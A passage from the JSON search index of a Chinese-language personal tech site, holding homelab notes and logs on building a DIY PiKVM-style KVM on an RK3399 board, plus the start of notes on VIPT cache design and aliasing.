INFO  [268880.714    stream] -- Destroying workers pool JPEG ...\n-- INFO  [268880.715    stream] -- Capturing stopped\n-- INFO  [268880.715    stream] -- Device fd=8 closed\n\n[Tue Jul 25 17:04:36 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n</code></pre></li> </ul> <p>ms2130 \u63d2USB3.0\u6ca1\u6709\u53cd\u5e94\uff0cUSB2.0\uff0cwindows\u548clinux\u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u5f00\u53d1\u677fUSB2.0\u65e0\u53cd\u5e94</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4f7f\u7528ustream\u6d4b\u8bd5\u662f\u5426\u80fd\u591f\u4f7f\u7528","title":"\u4f7f\u7528ustream\u6d4b\u8bd5\u662f\u5426\u80fd\u591f\u4f7f\u7528","text":"<p>pikvm/ustreamer: \u00b5Streamer - Lightweight and fast MJPEG-HTTP streamer (github.com) <pre><code>./ustreamer --device=/dev/video0 --host=0.0.0.0 --port=8000 -r 1920x1080 --format=MJPEG\n</code></pre></p> <p>ms2109</p> <pre><code>-- INFO  [266472.324    stream] -- Device fd=8 opened\n-- INFO  [266472.324    stream] -- Using input channel: 0\n-- INFO  [266472.339    stream] -- Using resolution: 1920x1080\n-- INFO  [266472.339    stream] -- Using pixelformat: MJPEG\n-- INFO  [266472.354    stream] -- Using HW FPS: 0 -&gt; 60 (coerced)\n-- ERROR [266472.354    stream] -- Device does not support setting of HW encoding quality parameters\n-- INFO  [266472.354    stream] -- Using IO method: MMAP\n-- INFO  [266472.357    stream] -- Requested 5 device buffers, got 5\n-- INFO  [266472.360    stream] -- Capturing started\n-- INFO  [266472.360    stream] -- Switching to HW encoder: the input is (M)JPEG ...\n-- INFO  [266472.360    stream] -- Using JPEG quality: encoder default\n-- INFO  [266472.360    stream] -- Creating pool JPEG with 1 workers ...\n-- INFO  [266472.360    stream] -- Capturing ...\n-- ERROR [266473.375    stream] -- Mainloop select() error: Inappropriate ioctl for device\n-- INFO  [266473.375    stream] -- Destroying workers pool JPEG ...\n-- INFO  [266473.377    stream] -- Capturing stopped\n-- INFO  [266473.379    stream] -- Device fd=8 closed\n</code></pre> <pre><code>[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n</code></pre>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u952e\u76d8\u95ee\u9898","title":"\u952e\u76d8\u95ee\u9898","text":"<p>\u63d2\u5165\u4e3b\u677fusb2.0\u63a5\u53e3\uff0cryzen dmesg\uff0c\u51e0\u79cd\u9519\u8bef\u5982\u4e0b - <code>usbhid 1-8:1.1: can't add hid device: -110</code> - <code>usb usb1-port8: Cannot enable. Maybe the USB cable is bad?</code> - <code>usbhid 1-8:1.1: can't add hid device: -71</code> <pre><code>\u279c  ~ sudo dmesg --color=always --ctime -W\n[Tue Jul 25 22:01:09 2023] usb 1-8: new high-speed USB device number 126 using xhci_hcd\n[Tue Jul 25 22:01:09 2023] usb 1-8: device descriptor read/64, error -71\n[Tue Jul 25 22:01:10 2023] usb 1-8: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:01:10 2023] usb 1-8: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:01:10 2023] usb 1-8: Product: Composite KVM Device\n[Tue Jul 25 22:01:10 2023] usb 1-8: Manufacturer: PiKVM\n[Tue Jul 25 22:01:10 2023] usb 1-8: SerialNumber: CAFEBABE\n[Tue Jul 25 22:01:10 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-8/1-8:1.0/0003:1D6B:0104.0104/input/input257\n[Tue Jul 25 22:01:10 2023] hid-generic 0003:1D6B:0104.0104: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:02:00.0-8/input0\n[Tue Jul 25 22:01:56 2023] usbhid 1-8:1.1: can't add hid device: -110\n[Tue Jul 25 22:01:56 2023] usbhid: probe of 1-8:1.1 failed with error -110\n[Tue Jul 25 22:02:42 2023] usbhid 1-8:1.2: can't add hid device: -110\n[Tue Jul 25 22:02:42 2023] usbhid: probe of 1-8:1.2 failed with error -110\n[Tue Jul 25 22:02:42 2023] usb 1-8: USB disconnect, device number 126\n\n\n[Tue Jul 25 22:02:44 2023] usb 1-8: new high-speed USB device number 127 using xhci_hcd\n[Tue Jul 25 22:02:44 2023] usb 1-8: device descriptor read/all, error -71\n[Tue Jul 25 22:02:45 2023] usb usb1-port8: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 22:02:45 2023] usb usb1-port8: attempt power cycle\n[Tue Jul 25 22:02:46 2023] usb 1-8: new high-speed USB device number 6 using xhci_hcd\n[Tue Jul 25 22:02:46 2023] usb 1-8: Device not responding to setup address.\n[Tue Jul 25 22:02:46 2023] usb 1-8: Device not responding to setup address.\n[Tue Jul 25 22:02:46 2023] usb 1-8: device not accepting address 6, error -71\n\n[Tue Jul 25 22:02:47 2023] usb 1-8: new high-speed USB device number 7 using xhci_hcd\n[Tue Jul 25 22:02:47 2023] usb 1-8: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:02:47 2023] usb 1-8: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:02:47 2023] usb 1-8: Product: Composite KVM Device\n[Tue Jul 25 22:02:47 2023] usb 1-8: Manufacturer: PiKVM\n[Tue Jul 25 22:02:47 2023] usb 1-8: SerialNumber: CAFEBABE\n[Tue Jul 25 22:02:47 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-8/1-8:1.0/0003:1D6B:0104.0105/input/input258\n[Tue Jul 25 22:02:47 2023] hid-generic 0003:1D6B:0104.0105: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:02:00.0-8/input0\n[Tue Jul 25 22:02:47 2023] usbhid 1-8:1.1: can't add hid device: -71\n[Tue Jul 25 22:02:47 2023] usbhid: probe of 1-8:1.1 failed with error -71\n[Tue Jul 25 22:02:47 2023] usbhid f1-8:1.2: can't add hid device: -71\n[Tue Jul 25 22:02:47 2023] usbhid: probe of 1-8:1.2 failed with error -71\n[Tue Jul 25 22:02:47 2023] usb 1-8: USB disconnect, device number 7\n</code></pre></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#usb30-ok","title":"usb3.0 ok","text":"<p>\u53d1\u73b0otg\u952e\u76d8\u63a5windows\u662f\u6ca1\u95ee\u9898\u7684\uff0c\u7136\u540e\u53d1\u73b0ryzen\u4f7f\u7528usb 3.0\u63a5\u53e3\u6ca1\u95ee\u9898 dmesg <pre><code>[Tue Jul 25 22:04:38 2023] usb 3-3.3: reset low-speed USB device number 28 using xhci_hcd\n[Tue Jul 25 22:04:39 2023] usb 3-3.1: reset full-speed USB device number 34 using xhci_hcd\n[Tue Jul 25 22:20:12 2023] usb 3-4: new high-speed USB device number 35 using xhci_hcd\n[Tue Jul 25 22:20:12 2023] usb 3-4: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:20:12 2023] usb 3-4: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:20:12 2023] usb 3-4: Product: Composite KVM Device\n[Tue Jul 25 22:20:12 2023] usb 3-4: Manufacturer: PiKVM\n[Tue Jul 25 22:20:12 2023] usb 3-4: SerialNumber: CAFEBABE\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.0/0003:1D6B:0104.0106/input/input259\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0106: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input0\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.1/0003:1D6B:0104.0107/input/input260\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0107: input,hidraw1: USB HID v1.01 Mouse [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input1\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.2/0003:1D6B:0104.0108/input/input261\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0108: input,hidraw2: USB HID v1.01 Mouse [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input2\n</code></pre></p> <p>lsusb\u53ef\u4ee5\u770b\u5230\u65b0\u51fa\u7684\u8bbe\u5907 <pre><code>Bus 003 Device 035: ID 1d6b:0104 Linux Foundation Multifunction Composite Gadget\n</code></pre></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#bios\u95ee\u9898","title":"bios\u95ee\u9898","text":"<p>\u53d1\u73b0\u53ea\u8981\u91cd\u542f\u8fdb\u5165bios\uff0c\u5c31\u4f1a\u51fa\u5f88\u591a\u95ee\u9898 - \u521a\u5f00\u59cb\u5c4f\u5e55\u548c\u952e\u9f20\u90fd\u662f\u597d\u7684\u3002\u9664\u4e86\u9f20\u6807\u79fb\u52a8\u5ef6\u8fdf\u5f88\u5927\uff0c\u57fa\u672c\u4e0d\u53ef\u7528 - \u63a5\u7740\u9f20\u6807\u5f7b\u5e95\u52a8\u4e0d\u4e86\u4e86 - \u7136\u540eking3399\u4e0d\u77e5\u4e3a\u4f55\u65e0\u6cd5\u8bbf\u95ee\u4e86\uff0c\u7f51\u7edcipv6\u65e0\u6cd5ping\u901a\uff0c\u6709\u65f6\u5219\u663e\u793a\u8d85\u65f63000ms - ssh session\u4e2d\u770b\u5230htop CPU\u5360\u7528\u7387\u5e76\u4e0d\u9ad8</p> <p>dmesg\u4e2d\u8bb8\u591a\u62a5\u9519 <pre><code>[Tue Jul 25 23:17:55 2023] wireguard: WireGuard 1.0.0 loaded. See www.wireguard.com for information.\n[Tue Jul 25 23:17:55 2023] wireguard: Copyright (C) 2015-2019 Jason A. Donenfeld &lt;Jason@zx2c4.com&gt;. All Rights Reserved.\n[Tue Jul 25 23:20:48 2023] device wg0 entered promiscuous mode\n[Tue Jul 25 23:21:25 2023] device wg0 left promiscuous mode\n[Tue Jul 25 23:21:26 2023] device wg0 entered promiscuous mode\n[Tue Jul 25 23:21:40 2023] device wg0 left promiscuous mode\n[Tue Jul 25 23:38:47 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:53:30 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:53:49 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:55:13 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\np^Xp^Xn^X[Tue Jul 25 23:57:50 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:57:53 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:57:54 2023] dwc3 fe800000.usb: failed to send remote wakeup\nl[Tue Jul 25 23:57:58 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:00 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:03 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:04 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:58:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:58:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Tue Jul 25 23:58:09 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:22 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:23 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:43 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:48 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:50 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Tue Jul 25 23:58:53 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Wed Jul 26 00:01:08 2023] dwc3 fe800000.usb: failed to send remote wakeup\n[Wed Jul 26 00:01:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Wed Jul 26 00:01:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Wed Jul 26 00:01:08 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n</code></pre></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#pi-kvm\u6587\u6863","title":"PI-KVM\u6587\u6863","text":"<p>PiKVM Project (github.com) - ustreamer\u9879\u76ee\u4e5f\u662f\u4ed6\u4eec\u7684 - kvmd</p> <p>\u6587\u6863\uff1aPiKVM Handbook</p> <p>DIY: pikvm/pikvm: Open and inexpensive DIY IP-KVM based on Raspberry Pi (github.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#mouse","title":"mouse","text":"<p>Mouse modes - PiKVM Handbook There are two modes of pointer device: absolute and relative.</p> <p>By default, PiKVM uses absolute positioning mode as the most convenient for the user and software. However, this is not always supported by the BIOS/UEFI. For such cases, support is provided for the relative mode of operation, which can be enabled in the config.</p> <p>Dynamic USB configuration - PiKVM Handbook \u7531\u4e8ebios\u8c8c\u4f3c\u5bf9absolute\u9f20\u6807\u517c\u5bb9\u6027\u4e0d\u591f\u597d\uff0c\u53ef\u4ee5\u76f4\u63a5\u7981\u7528</p> <p>In rare cases, the host BIOS/UEFI may not understand such a large number of emulated devices on single USB port, so some of them may need to be disabled.</p> <p>The\u00a0<code>kvmd-otgconf</code>\u00a0utility allows you to view and modify the USB configuration on the fly. It requires root permission and can be used for example from a web terminal.</p> <pre><code>kvmd-otgconf --disable-function mass_storage.usb0\nkvmd-otgconf --enable-function mass_storage.usb0\n</code></pre>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#faq","title":"FAQ","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#can-i-use-pikvm-for-gaming","title":"Can I use PiKVM for gaming?","text":"<p>No, because: - For HDMI-CSI bridge, bus bandwidth is not enough to transmit more than 1080p50. - For HDMI-USB dongle, high latency and low video quality. - General hardware video capture differs from software streaming and introduces additional latency.</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#can-i-use-pikvm-with-non-raspberry-pi-boards-orange-nano-etc","title":"Can I use PiKVM with non-Raspberry Pi boards (Orange, Nano, etc)?","text":"<p>Yes, but you will have to prepare the operating system yourself. For the PiKVM software, you will need to replace some config files (such as UDEV rules). If you are a developer or an experienced system administrator, you will not have any problems with this. In addition, we are open to patches. If you need help with this, please contact us via\u00a0Discord\u00a0(#unofficial_ports channel).</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#video-problem","title":"video problem","text":"<p>https://docs.pikvm.org/faq/#video-problems</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#csi-bridge-vs-usb-dongle","title":"CSI bridge vs USB dongle","text":"<p>The dongle is completely supported and PiKVM works great with it. But it has some disadvantages compared with recommended\u00a0HDMI-CSI bridge: USB gives a lot of latency (200ms vs 100ms for MJPEG) and it doesn't support stream compression control (you won't be able to use PiKVM in a place with a poor internet connection). There is no H.264 support at the moment. It also cannot automatically detect screen resolution. All this is caused by the hardware limitations of the dongle itself. In addition, some users report hardware problems: the dongle may not work in the BIOS or simply stop working after a while. It's a black box, and no one knows what's inside it. If you have problems with it, it will not be possible to fix them.</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5982\u4f55\u5b9e\u73b0atx\u7535\u6e90\u63a7\u5236","title":"\u5982\u4f55\u5b9e\u73b0ATX\u7535\u6e90\u63a7\u5236","text":"<ul> <li>\u9700\u8981\u4f7f\u7528atx \u63a7\u5236\u7ebf</li> <li>\u4e3b\u677f-PIKVM</li> <li>\u673a\u7bb1-PIKVM</li> <li>PIKVM\u6709\u4e00\u4e2a\u677f\u5b50\u7528\u4e8e\u5c06atx\u63a7\u5236\u7ebf\u8f6c\u6210RJ45\u3002\u677f\u5b50\u53ef\u4ee53d\u6253\u5370\u4e00\u4e2apcie slot\u652f\u67b6 ATX control board - PiKVM Handbook</li> </ul> <p>Pi-KVM\u9879\u76ee\u53ef\u4ee5\u652f\u6301\u8c03\u7528\u4e00\u534aGPIO\u9a71\u52a8\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7b2c\u4e09\u65b9\u5f00\u53d1\u677f\u63a7\u5236GPIO\u4e86\uff1f GPIO (pins, relays, lamps, etc) - PiKVM Handbook</p> <p>\u5d4c\u5165\u5f0f\u7684\u89c6\u9891\u63a5\u53e3 - MIPI DSI\u89c6\u9891\u8f93\u51fa\uff0cMIPI CSI\u89c6\u9891\u8f93\u5165</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u7f51\u7edc\u76f8\u5173","title":"\u7f51\u7edc\u76f8\u5173","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#wg-quick\u65e0\u6cd5\u81ea\u542f\u52a8","title":"wg-quick\u65e0\u6cd5\u81ea\u542f\u52a8","text":"<p>Wireguard - waiting for DNS before trying to start the interface \u00b7 Issue #30459 \u00b7 NixOS/nixpkgs (github.com)</p> <pre><code>Aug 07 23:17:57 king3399 wg-quick[1167]: [#] ip link add wg0 type wireguard\nAug 07 23:17:57 king3399 wg-quick[1167]: [#] wg setconf wg0 /dev/fd/63\nAug 07 23:17:57 king3399 wg-quick[1241]: Name or service not known: `op1.my.to:51820'\nAug 07 23:17:57 king3399 wg-quick[1241]: Configuration parsing error\nAug 07 23:17:57 king3399 wg-quick[1167]: [#] ip link delete dev wg0\nAug 07 23:17:58 king3399 systemd[1]: wg-quick@wg0.service: Main process exited, code=exited, status=1/FAILURE\n</code></pre>","tags":["KVM","rk3399","armbian"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/","title":"\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1","text":"<p>\u6d89\u53ca\u865a\u62dfcache\u5bfc\u81f4\u7684\u540c\u540d\u548c\u91cd\u540d\u95ee\u9898\uff1b\u91cd\u540d\u95ee\u9898bank\u548cL2\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1b\u8fdb\u7a0b\u5207\u6362\u65f6TLB\u7684\u64cd\u4f5c\uff1b\u4ec0\u4e48\u65f6\u5019\u9700\u8981\u663e\u793a\u5730\u63a7\u5236cache\u7b49\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u865a\u62dfcache\u7684\u95ee\u9898","title":"\u865a\u62dfcache\u7684\u95ee\u9898","text":"<p>\u8fd9\u91cc\u7684\u865a\u62dfcache\u6307\u7684\u662fvirtual index, virtual tag</p> <p>\u865a\u62dfcache\u4f4d\u4e8ecpu\u548ctlb\u4e4b\u95f4\uff0c\u7531\u4e8ecache\u547d\u4e2d\u5c31\u4e0d\u9700\u8981tlb\u5730\u5740\u6620\u5c04\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5bf9CPU\u9891\u7387\u9020\u6210\u8d1f\u9762\u5f71\u54cd\u3002</p> <p></p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u540c\u540d\u95ee\u9898homonyms","title":"\u540c\u540d\u95ee\u9898(homonyms)","text":"<p>\u4e0d\u540c\u8fdb\u7a0b\u6709\u7740\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u76f8\u540c\u7684\u865a\u62df\u5730\u5740\u5bf9\u5e94\u4e0d\u540c\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u8fdb\u7a0b\u5207\u6362\u65f6\uff0c\u7531\u4e8ecache\u4e2d\u91c7\u7528virtual tag\uff0c\u56e0\u6b64\u53ef\u80fd\u4ececache\u4e2d\u8bfb\u53d6\u5230\u5176\u5b83\u8fdb\u7a0b\u7684\u503c\u3002\uff08\u7269\u7406cache\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\uff09</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u53ef\u80fd\u53ea\u80fd\u901a\u8fc7\u624b\u52a8\u65e0\u6548\u6389cache\u6765\u89e3\u51b3\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u91cd\u540d\u95ee\u9898alias","title":"\u91cd\u540d\u95ee\u9898(alias)","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u865a\u62df\u5730\u5740\u6620\u5c04\u5b9e\u73b0\u5171\u4eab\u5185\u5b58\uff08\u4e0d\u540c\u865a\u62df\u5730\u5740VA1,VA2\uff0c\u6620\u5c04\u5230\u76f8\u540c\u7269\u7406\u5730\u5740PA\uff09 \u5982\u679c\u91c7\u7528\u865a\u62df\u7d22\u5f15\uff08virtual index\uff09\uff0c\u4f1a\u5e26\u6765\u91cd\u540d\u95ee\u9898\uff1a\u4e0d\u540c\u865a\u62df\u5730\u5740VA1,VA2\uff0c\u6620\u5c04\u5230\u76f8\u540c\u7269\u7406\u5730\u5740PA\uff0c\u4f46\u662f\u6620\u5c04\u5230\u4e0d\u540ccache set - \u4e00\u4efd\u6570\u636e\u88ab\u5b58\u50a8\u4e86\u4e24\u904d - \u5e76\u4e14\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u6570\u636e\u4e0d\u4f1a\u81ea\u52a8\u4fee\u6539\u53e6\u4e00\u4e2a</p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#vipt","title":"VIPT","text":"<p>VIPT\u662f\u4e00\u79cd\u5e76\u884c\u4e86TLB\u548ccache\u8bbf\u95ee\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002\u5229\u7528\u4e86\u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740offset\u90e8\u5206\u662f\u4e0d\u53d8\u7684\u7279\u70b9\u3002 - index \u2264 offset\u65f6\u7b49\u4ef7\u4e8ePIPT\uff0c\u4e0d\u540c\u7684\u662f\u8bbf\u95eeTLB\u548c\u7d22\u5f15cache line\u53ef\u4ee5\u5e76\u884c - index &gt; offset\u662f\u624d\u662fvirtual index\uff0c\u4e14virtual index = {a, offset}\uff0c\u53ea\u6709a\u90e8\u5206\u662f\u865a\u62df\u7684</p> <p></p> <p>\u5982\u679c\u8981\u6c42index &lt;= offset\u7684\u8bdd\uff0c\u5219cache\u4e00\u8def\u7684\u5927\u5c0f\u88ab\u9650\u5236\u4e3a\u6700\u5927\u4e00\u9875\u7684\u5927\u5c0f\uff08\u6bd4\u59824KB\uff09\uff0c\u589e\u5927cache\u7684\u5927\u5c0f\u53ea\u80fd\u589e\u52a0\u7ec4\u76f8\u8054\u5ea6\u3002</p> <p>\u800c\u91cd\u540d\u95ee\u9898\u53ea\u8981\u662f\u91c7\u7528\u865a\u62df\u7d22\u5f15\u5c31\u4f1a\u5b58\u5728\u3002\u56e0\u6b64VIPT\u5f53index &gt; offset\u65f6\uff0c\u4e5f\u4f1a\u5b58\u5728\u91cd\u540d\u95ee\u9898\u3002\u56e0\u6b64\u89e3\u51b3\u91cd\u540d\u95ee\u9898\u975e\u5e38\u91cd\u8981\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u91cd\u540d\u89e3\u51b3\u65b9\u6cd5","title":"\u91cd\u540d\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u6709\u4e24\u79cd\u89e3\u51b3\u91cd\u540d\u7684\u65b9\u6cd5 - bank\u65b9\u6cd5\u672c\u8d28\u8fd8\u662f\u5c06VIPT\u8f6c\u6362\u4e58PIPT - L2 \u5171\u4eabcache\u7684\u65b9\u6cd5\u5219\u901a\u8fc7L2\u6765\u5224\u65adL1\u662f\u5426\u53d1\u751f\u4e86\u91cd\u540d\uff0c\u7136\u540e\u65e0\u6548\u6389\u91cd\u540d\u90e8\u5206</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u4f7f\u7528bank\u89e3\u51b3","title":"\u4f7f\u7528bank\u89e3\u51b3","text":"<ul> <li>\u56fe\u4e2d\u76f4\u63a5\u6620\u5c04cache\u5927\u5c0f\u4e3a8k\uff0c\u9875\u5927\u5c0f\u4e3a4k\u3002index -offset = 1\u3002\u4e00\u4e2a\u7269\u7406\u5730\u5740\u6700\u591a\u53ef\u80fd\u51fa\u73b0\u5728\u4e24\u4e2acache line</li> <li>\u4f7f\u7528VIPT\u7684\u597d\u5904\u4fbf\u662f\u80fd\u591f\u5e76\u884c\u8bbf\u95eeTLB\u548ccache\u3002\u5982\u679cvirtual index &gt; page offset\u4f4d\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6240\u6709\u53ef\u80fd\u7684physical index\u90fd\u8bfb\u51fa\u6765\uff08\u4f7f\u7528bank\u5e76\u884c\uff09\uff0c\u7136\u540e\u518d\u6839\u636eTLB\u7ffb\u8bd1\u7684\u7ed3\u679c\u591a\u8def\u9009\u62e9\u3002\u8fd9\u6837\u672c\u8d28\u4e0a\u53c8\u56de\u5230\u4e86PIPT\u3002</li> <li>cache\u7684tag\u548cdata\u9700\u8981\u5206\u5f00\u5b58\u50a8\uff0c\u5199\u5165\u65f6\uff0c\u5148\u8bfb\u53d6tag\uff0c\u547d\u4e2d\u540e\uff0c\u518d\u5199data\u90e8\u5206\u3002</li> <li>\u53e6\u4e00\u4e2a\u7406\u89e3\uff1a\u76f8\u5f53\u4e8ePFN 12\u4f4d\u4e3a0\u7684\u5199\u5165bank0\uff0c\u4e3a1\u7684\u5199\u5165bank1\u3002\u7269\u7406\u5730\u5740\u662f\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u4e0d\u4f1a\u53d1\u751f\u91cd\u540d\u3002 </li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u4f7f\u7528l2-cache\u89e3\u51b3","title":"\u4f7f\u7528L2 cache\u89e3\u51b3","text":"<p>\u4f7f\u7528L2 inclusive cache\u89e3\u51b3\u865a\u62dfcache \u91cd\u540d\u95ee\u9898\u3002 - \u601d\u8def\uff1aL1 